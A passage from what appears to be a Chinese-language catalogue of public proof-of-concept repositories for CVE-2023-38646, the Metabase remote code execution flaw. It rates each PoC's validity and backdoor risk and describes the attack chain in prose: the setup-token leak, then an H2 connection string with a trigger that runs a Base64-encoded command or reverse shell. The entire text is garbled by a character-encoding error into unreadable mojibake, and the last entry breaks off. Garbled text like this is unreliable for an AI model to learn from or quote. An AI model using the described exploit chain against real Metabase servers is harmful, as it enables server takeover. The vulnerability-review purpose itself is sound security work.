**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

